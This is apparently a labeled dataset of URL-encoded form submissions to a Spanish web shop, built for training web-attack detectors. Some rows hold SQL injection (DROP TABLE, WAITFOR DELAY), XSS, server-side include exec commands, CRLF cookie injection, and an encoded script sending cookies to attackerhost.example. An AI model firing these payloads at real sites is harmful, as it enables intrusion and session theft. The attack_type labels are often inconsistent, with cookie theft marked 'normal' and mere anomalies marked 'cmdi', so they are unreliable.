payload,attack_type,label
id=1&nombre=Queso+Manchego%22+AND+%221%22%3D%221&precio=100&cantidad=56&B1=A%F1adir+al+carrito,cmdi,1
ERRORmSG=PAROS%2522%2bSTYLE%253d%2522BACKGROUND%253aURL%2528JAVASCRIPT%253aALERT%2528%2527pAROS%2527%2529%2529%26ID%3d2,xss,1
errorMsgA=Credenciales+incorrectas,normal,1
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&login=jeavons6&pwd=%2F5e5s5%F3n&remember=off&B1=Entrar,cmdi,1
B2=Vaciar+carrito,normal,0
id=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Queso+Manchego&precio=100&cantidad=4&B1=A%F1adir+al+carrito123,sqli,1
id=2&nombre=Vino+Rioja&precio=100%2F&cantidad=63&B1=A%F1adir+al+carrito,cmdi,1
ida=2,normal,1
modo=registro&login=antinucc&password=zullarse&nombre=Jos%E9+Mar%EDa&apellidos=Rodrigo+Ambr%F3s&email=leibman%40softstylestudio.be&dniA=90993097Z&direccion=Urbanizacion+Residencial+Ronda+36+9%3FB&ciudad=Riells+i+Viabrea&cp=42150&provincia=Teruel&ntc=9974355200418178&B1=Registrar,cmdi,1
modo=insertar&precio=900&B1=Pasar+por+caja%27OR%27a%3D%27a,cmdi,1
B2=Vaciar+carrito123,normal,0
modo=registro&login=haynor&password=metrorragia&nombre=Inca&apellidos=Letra+Bala%F1%E0&email=lyden%40.mv&dni=72523597C&direccion=Travesia+Doctor+Sanchez%2C+139%2C+12%3FH&ciudad=Noblejas&cp=43421&provincia=Palencia&ntc=6862303368797459&B1=Registrar123,normal,0
ERRORmSG=cREDENCIALES+INCORRECTAS%3cscript%3eALERT%28%22pAROS%22%29%3b%3c%2fscript%3e,xss,1
modo=entrar&login=ryall&pwd=m6ke&remember=on&b1=entrar,normal,0
modo=registro&login=program&password=9BoCeLaDO&nombre=Kasuhiro&apellidos=Argando%F1a+Cobo&email=dufour_mannhardt%40privatebanking.com.us&dni=33671238C&direccion=Ayuntamiento%2C+88%2C+&ciudad=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=34191&provincia=Navarra&ntc=8395803626511609&B1=Registrar123,sqli,1
MODO=REGISTRO&LOGIN=BENNET&PASSWORD=%2496C5SA&NOMBRE=sID&APELLIDOS=eCHEGOYEN+pAZAR%e1N&EMAIL=SENGHOR-GOLLING3%4024HTRANSLATIONS.HT&DNI=16864786j&DIRECCION=bARRIADA+dE+lA+dOCTORA+15+&CIUDAD=rOA&CP=03610%27%3b+drop+table+USUARIOS%3b+select+*+from+DATOS+where+NOMBRE+like+%27%25&PROVINCIA=vALLADOLID&NTC=0695001148270797&b1=rEGISTRAR,sqli,1
modo=insertar&precio=9423&B1=Confirmar,normal,0
modo=registro&login=dempsey&password=cABALlaZo&nombre=Atila&apellidos=Gorgone+Oteo&email=pristo%40auditar.com.mr&dni=93515707F&direccion=Ent*rad%2Ba+Fa*ba%2C+135+13-F&ciudad=Quart+de+les+Valls&cp=27143&provincia=Teruel&ntc=4795657377171700&B1=Registrar,cmdi,1
id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=55&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=brier&password=grajear&nombre=Yaci&apellidos=Aznar&email=mamukos4%40culturalsanpedrocf.uk&dni=12354547M&direccion=Rua+Principal%2C+176+&ciudad=Villanueva+de+Carazo&cp=04276&provincia=Navarra&ntc=1734128437321844&B1=Registrar,normal,0
errormsga=credenciales+incorrectas,normal,1
id=3&nombre=queso+manchego&precio=85&cantidad=42&b1=a%f1adir+al+carrito,normal,0
B2A=Vaciar+carrito123,normal,1
id=2&nombre=Queso+Manchego&precio=85&cantidad=56&B1=A%F1adir+al+carrito,normal,0
B2=Vaciar+carrito%4040,normal,1
errorMsg=Credenciales+incorrectas123,normal,0
id=2,normal,0
modo=registro&login=verene&password=espiritUAlizAci%F3N&nombre=Stella&apellidos=Gim%E9nez+Sans&email=degen%40tecnoindomo.qa&dni=89878127S&direccion=Pasaje+De+Las+Cig%FCe%F1as%2C+140+7-G&ciudad=Moros&cp=17650&provincia=Ourense&ntcA=4769477830096089&B1=Registrar,cmdi,1
modo=registro&login=kokoska1&password=jusmeter-se&nombre=Fedor&apellidos=Sanou+Bellsol%E0&email=leiding%40ubuybetter.cat&dni=21840329N&direccion=Calle+Francisco+Gervas%2C+174%2C+9H&ciudad=Gines&cp=33500&provincia=Navarra&ntc=9009008887787551&B1=Registrar,normal,0
modo=registro&login=toddi&password=compatr%F3n&nombre=Fulgencia&apellidos=Alguer%F3+Murillo&email=trintignant.iwasaki%40softgold.com.np&dni=57317186J&direccion=C%2F+Santa+Olaja%2C+121+2%3FD&ciudad=Ogassa&cp=12312&provincia=Huesca&ntc=6537476325760255&B1=Registrar123,normal,0
id=3&nombreA=Queso+Manchego&precio=39&cantidad=5&B1=A%F1adir+al+carrito,cmdi,1
idA=1,normal,1
id=2,normal,0
modo=entrar&login=petretta&pwd=cha%2Fnga&remember=off&B1=Entrar,cmdi,1
B2=Vaciar+carritosessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F123,normal,1
modo=registro&login=olivie&password=re0348n1AR&nombre=Ivan&apellidos=Elbar+Brice%F1o&email=elliot3%40connect.li&dni=65683923V&direccion=Los+Caminos%2C+129%2C+13-G&ciudad=Hinojosa+del+Campo&cp=10130&provincia=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&ntc=7487181086019639&B1=Registrar,xss,1
ID=%22%3e%3c%21--%23exec+CMD%3d%22DIR+%22--%3e%3c,sqli,1
modo=entrar&login=fatica&pwd=preconizac%21i%F3n&rememberA=off&B1=Entrar,cmdi,1
id=2,normal,0
modo=entrar&login=an-son&pwd=4up493a562i5&remember=on%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Entrar,sqli,1
ERRORmSG=BOB%2540%253cscrIPT%253eALERT%2528pAROS%2529%253c%252fSCRipt%253e.PAROSPROXY.ORG,xss,1
modo=insertar&precio=8151&B1=Pasar+por+caja,normal,0
modo=entrar&login=healy&pwd=c3er2e4ue15&remember=on&b1=entrar,normal,0
modo=entrar&login=naguib&pwd=0o380ado6&remember=off&B1=Entrar123,normal,0
errormsg=credenciales+incorrectas,normal,0
id=+,normal,1
modo=registro&login=%253F&password=su5a&nombre=Rogato&apellidos=Cucarell+Caridad&email=zmed%40tabernarinconete.uk&dni=19477061V&direccion=Manuel+Paez+Xaramillo+33%2C+6B&ciudad=Estella%2FLizarra&cp=26321&provincia=Tarragona&ntc=9995470732934706&B1=Registrar,cmdi,1
modo=registro&login=jasper&password=lebRILLo&nombre=Vivaldo&apellidos=Geli+Febo&email=tchjan-lian.quadflieg%40comerciosdeaspe.se&dni=85510378N&direccion=Av.+Pablo+Iglesias+106%2C+&ciudad=Almog%EDa&cp=31560&provincia=Badajoz&ntc=7509082311963954&B1=Registrar,normal,0
modo=insertar&precio=394&B1=Pasar+por+caja%2F,cmdi,1
modo=insertar&precio=1466&B1=Confirmar,normal,0
errormsg=%257c,normal,1
id=2&nombre=Vino+Rioja&precio=100&cantidad=84&B1=A%F1adir+al+carrito,normal,0
id=2&nombre=Queso+Manchego&precio=85&cantidad=43&B1=A%F1adir+al+carrito,normal,0
B2=Vaciar+carrito,normal,0
modo=registro&login=clarence&password=VARoNA&nombre=Arnulfo&apellidos=Aniceto+Lacunza&email=polk%40tintaultravioleta.mx&dniA=52722813M&direccion=Calle+Infante+Don+Luis%2C+92+&ciudad=Ribes+de+Freser&cp=16122&provincia=Valencia&ntc=8960498379744557&B1=Registrar,cmdi,1
modo=registro&login=neetu&password=85nefici0r3o&nombre=Indamira&apellidos=Cote+Suengas&email=keast%40comodepilarse.si&dni=42361844F&direccion=C%2F+Alcalde+Gabriel+Mejias+Pombo+121+6-F&ciudad=Villar+de+la+Encina&cp=50296&provincia=Vizcaya&ntc=6511294088626969&B1=Registrar,normal,0
B2=Vaciar+carrito,normal,0
id=1&nombre=Vino+Riojaany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&precio=39&cantidad=73&B1=A%F1adir+al+carrito,cmdi,1
modo=entrar&login=haewon7&pwd=ag-uzadura&remember=on&B1=Entrar,normal,0
modo=insertar&precio=1680&B1=Confirmar,normal,0
id=2&nombre=Queso+Manchego&precio=39&cantidad=58&B1=A%F1adir+al+carrito,normal,0
ID=%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
modo=registro%27+DELETE+FROM+USERS&login=messier&password=c7b183o&nombre=Nicodemo&apellidos=Triola+Villuend&email=galloway%40rtce.gu&dni=35507822P&direccion=Numero+15%2C+151%2C+&ciudad=Castrillo+de+la+Guare%F1a&cp=23657&provincia=Toledo&ntc=1278501676319264&B1=Registrar,cmdi,1
B2A=Vaciar+carrito,normal,1
B2=Vaciar+carrito%2B123,normal,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=74&B1=A%F1adir+al+carrito%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25,sqli,1
modo=entrar&login=yoonmo2paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&pwd=azo5da&remember=off&B1=Entrar,xss,1
id=2123,normal,0
modo=registro&login=destry&password=26sEmbLe&nombre=Wenceslao&apellidos=Machado+Labarca&email=pasqual%40stockdefotos.tel&dni=80999708X&direccion=Pla%E7a+De+%2BMontserrat+Roca+i+Bal*ta%2C+19*9+3-E&ciudad=Cubillo+de+Uceda%2C+El&cp=43151&provincia=Teruel&ntc=0708219176163620&B1=Registrar,cmdi,1
modo=registro&login=morra&password=8uS8ri5or&nombre=Vaniria&apellidos=Setvall+Herreros&email=destac.rebenciuc%40tiposdedrogas.tc&dni=02068723B&direccion=C%2F+Orellana+50%2C+&ciudad=Castell+de+Cabres&cp=19209&provincia=Salamanca&ntc=0437385701767264&B1A=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas123,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
id=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,xss,1
id=1&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=24&b1=a%f1adir+al+carrito,normal,0
modo=registro&login=gwohsing&password=cel65co&nombre=Faimunda&apellidos=Saiz&email=tuamea%40wave.com.by&dni=33744160D&direccion=Once+Paradas%2C+139+&ciudad=Ivars+d%27Urgell&cp=24530&provincia=Guip%FAzcoa&ntc=8772381547327931&B1=Registrar,normal,0
id=3&nombreA=Queso+Manchego&precio=85&cantidad=94&B1=A%F1adir+al+carrito,cmdi,1
B2=Vaciar+carrito,normal,0
B2=Vaciar+carrito123,normal,0
modo=entrar&login=i-ching&pwd=escon*der&remember=on&b1=entrar,normal,0
modo=entrar&login=yanshek&pwd=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&remember=off&B1=Entrar,xss,1
modo=registro&login=vyza&password=0ehusa2&nombre=Elido&apellidos=Freixes+Naval%F3n&email=bogarde4%40tiendasyofertas.museum&dni=52031263L&direccion=Calle+Son+Pujol+Des+Garroves%2C+S%2FN%2C+&ciudad=Noviercas&cp=10373&provincia=Vizcaya&ntc=2178510189723400&B1=Registrar123,normal,0
id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=48&B1=A%F1adir+al+carrito,normal,0
modo=insertar&precio=2408&B1=Pasar+por+caja%2F,cmdi,1
modo=registro&login=iftekhar&password=056cun95v08ac49%f37&nombre=cinda&apellidos=cote+suengas&email=chassigneux.tekurarere3%40truecatucasa.gg&dni=27581268j&direccion=hermanos+gascon+141+&ciudad=selva+del+camp%2c+la&cp=25136&provincia=ja%e9n&ntc=9959095212447652&b1=registrar,normal,0
b2=vaciar+carrito,normal,0
B2=Vaciar+carritoparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2123,xss,1
errorMsg=Credenciales+incorrectas123,normal,0
b2=%22%3e%3c%21--%23exec+CMD%3d%22DIR+%22--%3e%3c,sqli,1
modo=insertar&precio=6768&B1=Pasar+por+caja%2F,cmdi,1
errormsga=credenciales+incorrectas,normal,1
id=1&nombre=Queso+Manchego&precio=85&cantidad=81&B1=A%F1adir+al+carrito,normal,0
idA=2,normal,1
id=2&nombre=Queso+Manchego&precio=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&cantidad=2&B1=A%F1adir+al+carrito,xss,1
B2=Vaciar+carrito123,normal,0
modo=registro&login=jed&password=mordazmente&nombre=theo&apellidos=russo&email=tinti%4021horas.hr&dni=81878772z&direccion=calle+poeta+guimera%2c+2+13h&ciudad=confrides&cp=46266&provincia=guadalajara&ntc=2174818451824569&b1=registrar,normal,0
idA=2,normal,1
B2=Vaciar+carrito123,normal,0
modo=entrar&login=sarene&pwd=%27cerebel%27%2Co&remember=off&B1=Entrar,cmdi,1
id=2,normal,0
errormsg=credenciales+incorrectas,normal,0
modo=%4040&login=ada&pwd=desmocadero&remember=on&B1=Entrar,cmdi,1
id=3&nombre=Vino+Rioja&precio=100&cantidad=61&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=wenzel&password=borrica&nombre=Mar%EDa+de+Aranz%FA&apellidos=Moretti+Alegre&email=terry%40mtos.ar&dni=56546514W&direccion=Rua+Bamio%2C+190+11%3FH&ciudad=Pelarrodr%EDguez&cp=43550&provincia=Lleida&ntc=0947549871262969&B1=Registrar,normal,0
modo=registro&login=dunlap&password=d5s3748dA&nombre=Walerico&apellidos=Bartra+Bergu%EDo&email=luca8%40mobilecrm.iq&dni=41944054N&direccionA=Pla%E7a+Don+Ramon+Serrano+Su%F1er%2C+S%2FN+&ciudad=Antig%FCedad&cp=09610&provincia=Madrid&ntc=2664915448366606&B1=Registrar,cmdi,1
id=1,normal,0
id=2&nombre=Queso+Manchego&precioA=39&cantidad=27&B1=A%F1adir+al+carrito,cmdi,1
errormsg=credenciales+incorrectas,normal,0
modo=insertar&precio=1304&B1=Pasar+por+caja123,normal,0
id=3&nombre=Vino+Rioja&precio=100&cantidad=24&B1=A%F1adir+al+carrito,normal,0
id=3&nombre=Vino+Rioja&precio=100&cantidad=14&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=westfall&password=cal5br2&nombre=laurencia&apellidos=flo+hosta&email=cusanelli%40wdsl.ao&dni=91704360w&direccion=calle+juan+valera+97+12d&ciudad=cuevas+de+san+clemente&cp=31410&provincia=navarra&ntc=0945727443543584&b1=registrar,normal,0
id=1sessionid%3d12312312%26+username%3d%253c%2573%2563%2572%2569%2570%2574%253e%2564%256f%2563%2575%256d%2565%256e%2574%252e%256c%256f%2563%2561%2574%2569%256f%256e%253d%2527%2568%2574%2574%2570%253a%252f%252f%2561%2574%2574%2561%2563%256b%2565%2572%2568%256f%2573%2574%252e%2565%2578%2561%256d%2570%256c%2565%252f%2563%2567%2569%252d%2562%2569%256e%252f%2563%256f%256f%256b%2569%2565%2573%2574%2565%2561%256c%252e%2563%2567%2569%253f%2527%252b%2564%256f%2563%2575%256d%2565%256e%2574%252e%2563%256f%256f%256b%2569%2565%253c%252f%2573+%2563%2572%2569%2570%2574%253e%3f,normal,1
modo=registro&login=torre&password=4ere3id13&nombre=Yesenia&apellidos=Da+Silva+Kerber&email=tchjan-lian.quadflieg%40comerciosdeaspe.se&dni=02056001P&direccion=Angel+Martin+Puebla+157%2C+&ciudad=Almonacid+de+la+Sierra&cp=16535&provincia=Almer%EDa&ntc=3467840384205414&B1=Registrar,normal,0
errorMsgA=Credenciales+incorrectas123,normal,1
modo=insertar&precio=6801&B1=Confirmar%2F,cmdi,1
modo=registro&login=donnelly&password=14a8u19lero&nombre=Alessandra&apellidos=Ricom%E0+Morato&email=gambold%40fok.so&dni=66367222D%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&direccion=Calle+Cavallers+63+&ciudad=Tocina&cp=03729&provincia=Valladolid&ntc=2169388539628734&B1=Registrar,sqli,1
errorMsg=Credenciales+incorrectasbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org123,xss,1
modo=entrar&login=soules&pwd=datario&remember=on&B1=Entrar,normal,0
modo=entrar&login=sus%2C*an%2Bto5&pwd=FuMaRaDa&remember=on&B1=Entrar,cmdi,1
errormsga=credenciales+incorrectas,normal,1
modo=entrar&login=staton&pwd=Tra5i0o0ED7a&remember=on&B1=Entrar,normal,0
modo=insertar&precio=7677&B1=Confirmar123,normal,0
errormsg=credenciales+incorrectas,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&login=trish&pwd=7O30S5Si%D37&remember=off&B1=Entrar,normal,0
modo=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&login=chaar&pwd=pe4ibl171o&remember=on&B1=Entrar123,sqli,1
modo=entrar&login=melicent&pwd=s4g51r&remember=off&B1=Entrar,normal,0
B2=Vaciar+carrito,normal,0
modo=entrar&login=cushing&pwd=614n3r9&remember=off&B1=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,xss,1
modo=registro&login=chanchla&password=4ino57l&nombre=Atilio&apellidos=Rull&email=ward%40fortelingenieria.si&dni=42798379W&direccion=Calle+Virgen+De+Bego%F1a+19+&ciudad=Broto&cp=09107&provincia=Segovia&ntc=5259660554384998&B1=Registrar,normal,0
id=2,normal,0
modo=registro&login=farah&password=%21FIlatelia&nombre=Cayetano&apellidos=Mesquida+Carrasco&email=kaynak%40campodegolf.com.sc&dni=86164975Y%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&direccion=Calle+Pellejero+Villoria%2C+184+11%3FB&ciudad=Viveros&cp=21870&provincia=C%F3rdoba&ntc=1552564007403755&B1=Registrar,sqli,1
idA=1,normal,1
modo=entrar&login=sosa&pwd=FraCcIoNArIo&remember=on&B1=Entrar,normal,0
modo=registro&login=wilie&password=v9n939z6&nombre=gina&apellidos=subir%f3s+figaredo&email=urchins%40waikilu.mg&dni=93698052p&direccion=gredos%2c+114+12%3fg&ciudad=castroverde&cp=05520&provincia=burgos&ntc=7277765230207053&b1=registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=donnelly&password=14a8u19lero&nombre=Alessandra&apellidos=Ricom%E0+Morato&email=gambold%40fok.so&dniA=66367222D&direccion=Calle+Cavallers+63+&ciudad=Tocina&cp=03729&provincia=Valladolid&ntc=2169388539628734&B1=Registrar,cmdi,1
modo=registro&login=sarna5&password=%21laureando&nombre=Ledy&apellidos=Calera+Hera&email=allenbury-nantasiri%40audiosat.az&dni=02790010H&direccion=Calle+Castilleja+De+La+Cuesta+70%2C+&ciudad=T%EDrvia&cpA=03638&provincia=Girona&ntc=1446048659469569&B1=Registrar,cmdi,1
B2=Vaciar+carrito%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
errorMsg=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,xss,1
B2=Vaciar+carrito,normal,0
modo=insertar&precio=9570&B1=Confirmar123,normal,0
ERRORmSG=BOB%2540%253cscrIPT%253eALERT%2528pAROS%2529%253c%252fSCRipt%253e.PAROSPROXY.ORG,xss,1
errorMsgA=Credenciales+incorrectas,normal,1
modo=insertar&precio=4981&B1=Pasar+por+caja%2F,cmdi,1
id=1,normal,0
id=%2520,normal,1
modo=registro&login=chapman&password=Lor81a5o&nombre=Kamil&apellidos=Calderer+Ares&email=tait%40ibizasounds.ir&dni=96277205X&direccion=C%2F+Darrillo+De+La+Magdalena+S%2FN+&ciudad=Perales+del+Alfambra&cp=26674&provincia=Navarra&ntc=1465508294467893&B1=Registrar,normal,0
id=2%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39%2F&cantidad=38&B1=A%F1adir+al+carrito,cmdi,1
modoA=insertar&precio=3574&B1=Pasar+por+caja,cmdi,1
id=1&nombre=Queso+Manchego&precio=39%2F&cantidad=30&B1=A%F1adir+al+carrito,cmdi,1
modo=insertar%257C&precio=7602&B1=Confirmar,cmdi,1
modo=registro&login=armand&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dniA=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&provincia=Zaragoza&ntc=8608089924764976&B1=Registrar,cmdi,1
B2=Vaciar+carrito,normal,0
id=2&nombre=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=100&cantidad=97&B1=A%F1adir+al+carrito123,sqli,1
errorMsgA=Credenciales+incorrectas,normal,1
id=2&nombre=Queso+Manchego&precio=39&cantidad=76&B1=A%F1adir+al+carrito,normal,0
b2a=vaciar+carrito,normal,1
modo=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&login=marlee-j5&pwd=ple4n637127&remember=on&B1=Entrar,xss,1
modo=registro&login=kerlovic&password=lad%F3n&nombre=Vitalia&apellidos=Baeza+Redon&email=slavin%40windshiptrader.coop&dni=95642019S&direccion=Jose+Maria+Mortes+Lerma%2C+151+11-D&ciudad=Campos+del+Para%EDso&cp=18449&provincia=Alicante&ntc=8158378459741170&B1=Registrar,normal,0
modo=entrar&login=iocntrl&pwd=legadura&remember=on&B1=Entrar,normal,0
modo=registro&login=sameh&password=encara&nombre=Marcelino&apellidosA=Mundo+Osarte&email=vanni%40sietepeines.eu&dni=76973319R&direccion=C%2F+Eugenio+Arbones%2C+84%2C+9-G&ciudad=Daya+Vieja&cp=43770&provincia=Barcelona&ntc=7672564317265745&B1=Registrar,cmdi,1
ida=2,normal,1
modo=registro&login=darn&password=ahidalg%2Cado&nombre=Ravi&apellidos=Morell&email=costa_lejeune%40clichotel.my&dni=16929821G&direccion=Ingeniero+Mari%F1o%2C+170+10-A&ciudad=Parets+del+Vall%E8s&cp=20577&provincia=Barcelona&ntc=7457334236490109&B1=Registrar,cmdi,1
modo=insertar&precio=2589&b1=pasar+por+caja,normal,0
ERRORmSG=PAROS%2522%2520STYLE%3d%2522BACKGROUND%3aURL%28JAVASCRIPT%3aALERT%28%27pAROS%27%29%29,xss,1
modo=registro&login=gilly&password=f%2Bemenciar&nombre=Octaviano%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&apellidos=Heredia+Wald&email=meskill_ferlinghetti%40wormee.pw&dni=37936735Y&direccion=C%2F+Ginebre%2C+98+&ciudad=Manzanillo&cp=33310&provincia=Segovia&ntc=1741584206084308&B1=Registrar,sqli,1
modo=entrar&login=jamin&pwd=contado&rememberA=off&B1=Entrar,cmdi,1
modo=registro&login=mckee&password=A98A60Az90&nombre=Elivio&apellidos=Martell+Canasa&email=blomfield%40enlanzarote.com.al&dni=78360619X&direccion=Carretera+De+Ribadesella+a+Canero+68+10-G&ciudad=Villavaquer%EDn&cp=10739&provincia=Soria&ntc=8323552403219603&B1=Registrar,normal,0
id=2&nombre=Queso+Manchego&precio=39&cantidad=34&B1=A%F1adir+al+carrito,normal,0
B2A=Vaciar+carrito,normal,1
ID=1%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=seda&password=apartadero&nombre=Remberta&apellidos=Ortigas+Huerta&email=pedemonte%40mystyleperfume.th&dni=97649797P&direccion=Calle+Huesca%2C+136%2C+&ciudad=Fuente+Encalada&cp=43790&provincia=Palencia&ntc=7303174655343439&B1=Registrar,normal,0
modo=registro&login=hantak&password=t82925r&nombre=Lihue&apellidos=Coev+Carles&email=holzschuh7%40superlinks.ga&dni=60956471P&direccion=Fuenterrabia+130+2F&ciudad=Palacios+de+Sanabria&cp=48498&provincia=Barcelona&ntc=6136393758401812&B1=Registrar%7C,cmdi,1
id=1&nombre=Jam%F3n+Ib%E9rico&precio=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&cantidad=78&B1=A%F1adir+al+carrito,sqli,1
MODO=REGISTRO&LOGIN=MARIAELE&PASSWORD=CLeROFoBIA&NOMBRE=rOYCE&APELLIDOS=cORNETERO+sIRUELA%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&EMAIL=JAGER%40TRESBRUJAS.HR&DNI=41502558r&DIRECCION=cALLE+pICO+mAMPODRE+106%2c+&CIUDAD=aLHAMA+DE+aRAG%f3N&CP=01439&PROVINCIA=bARCELONA&NTC=6736665084880306&b1=rEGISTRAR,sqli,1
modoA=insertar&precio=2612&B1=Pasar+por+caja,cmdi,1
modo=registro&login=austin&password=va%ED6A&nombre=Dami%E1n&apellidos=Haddock&email=herndon%40coches%40a%40utoma%40ticos.il&dni=12773567B&direccion=Oasis%2C+89+&ciudad=Y%E9meda&cp=42181&provincia=A+Coru%F1a&ntc=1457291251258810&B1=Registrar,cmdi,1
id=2,normal,0
id=3&nombre=Queso+Manchego&precio=39&cantidad=67&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=hernan&pwd=PER%CDs%2FtoLE&remember=on&B1=Entrar,cmdi,1
errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org123,xss,1
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&login=gamaliel&pwd=aclor%2Fh%2C%EDdric%2Ca&remember=on&B1=Entrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=serban&password=tripudio&nombre=Eduardo&apellidos=Ortega+Sacrista&email=laffan%40phd-photodecor.bv&dni=93289880V&direccion=C%2F+Serrano%2C+125%2C+&ciudad=Sarri%E0+de+Ter&cp=22728&provincia=Madrid&ntc=7993090576542905&B1=Registrar,normal,0
modo=registro&login=fitness&password=tripicallero&nombre=Mar%EDa&apellidos=Lesaca+Clar%E0&email=nixon%40chinavende.bw&dni=99631010R&direccion=Torrent+De+Can+Besora%2C+68+&ciudad=Higuera&cp=42141&provincia=C%F3rdoba&ntc=4809909158427521&B1=Registrar,normal,0
id=2&nombre=Vino+Rioja&precio=85&cantidad=94&B1=A%F1adir+al+carrito123,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
